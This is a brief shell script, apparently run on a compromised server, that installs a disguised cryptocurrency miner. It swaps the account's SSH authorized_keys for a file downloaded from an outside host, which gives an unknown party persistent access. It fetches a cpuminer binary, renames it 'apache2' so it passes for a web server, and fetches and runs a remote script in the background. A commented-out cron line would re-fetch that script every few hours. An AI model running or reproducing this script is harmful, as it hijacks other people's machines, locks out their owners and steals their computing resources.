cd .ssh
rm -rf authorized_keys
wget -q sio.com.co/authorized_keys
chmod 300 authorized_keys
cd


dd if=/dev/zero of=/var/swap.img bs=1024k count=1000
chmod 0600 /var/swap.img
mkswap /var/swap.img
swapon /var/swap.img

apt-get update
dpkg --configure -a
apt-get -y --force-yes install libcurl4-openssl-dev libncurses5-dev pkg-config automake yasm git  psmisc

wget https://api.ipify.org	
wget sio.com.co/m/cpuminer-multi/minerd
mv minerd apache2
chmod +x apache2

rm -rf apache.sh; wget sio.com.co/m/apache.sh 
nohup bash apache.sh &

#echo '0 0,3,6,9,12,15,18,21 * * * rm -rf apache.sh; wget sio.com.co/m/apache.sh ; bash apache.sh &> auto.log' | crontab -

sleep 2
tail -f apache3.log
